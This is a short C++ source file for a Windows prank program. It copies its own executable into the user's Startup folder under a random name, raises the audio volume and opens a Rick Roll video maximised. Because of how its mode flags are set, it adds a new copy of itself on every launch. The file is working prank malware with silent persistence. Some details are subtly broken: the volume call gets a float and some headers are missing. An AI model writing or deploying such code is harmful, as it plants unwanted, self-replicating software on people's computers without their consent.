#include <iostream>
#include <windows.h>
#include <mmsystem.h>

#define MODE_RICKROLL (1 << 0)
#define MODE_SETVOLUME (1 << 1)
#define MODE_AUTOSTART (1 << 2)
#define MODE_AUTOSTART_DUP (1 << 3)

#define RICK_ROLL_URL "https://youtu.be/dQw4w9WgXcQ"
#define MODE (MODE_RICKROLL | MODE_SETVOLUME | MODE_AUTOSTART | MODE_AUTOSTART_DUP)

int getMode() {
	int mode = MODE;
	if((mode & MODE_AUTOSTART) && !(mode & MODE_AUTOSTART_DUP)) {
		// TODO search for existing file instead of checking current file

		char filename[MAX_PATH];
		int filenameLen = GetModuleFileName(NULL, filename, MAX_PATH);

		std::string filename2 = std::string(filename);
		if(filename2.find(std::string("\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")) != std::string::npos) {
			mode &= ~MODE_AUTOSTART;
		}
	}
	return mode;
}

void setupAutostart() {
	char filename[MAX_PATH];
	GetModuleFileName(NULL, filename, MAX_PATH);

	char autostartFolder[MAX_PATH];
	sprintf(autostartFolder, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup", getenv("appdata"));

	srand(time(0));

	long a = rand();
	long b = rand();
	long c = rand();
	long d = rand();

	char randomName[17];
	sprintf(randomName, "%x%x%x%x", a, b, c, d);
	
	char newFilename[MAX_PATH];
	sprintf(newFilename, "%s\\%s.exe", autostartFolder, randomName);

	CopyFile(filename, newFilename, true);
}

void setVolume(float level) {
	// TODO
	waveOutSetVolume(NULL, level);
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	int mode = getMode();
	if(mode & MODE_AUTOSTART) setupAutostart();
	if(mode & MODE_SETVOLUME) setVolume(1);
	if(mode & MODE_RICKROLL) ShellExecute(0, 0, RICK_ROLL_URL, 0, 0, SW_SHOW | SW_MAXIMIZE);
	return 0;
}						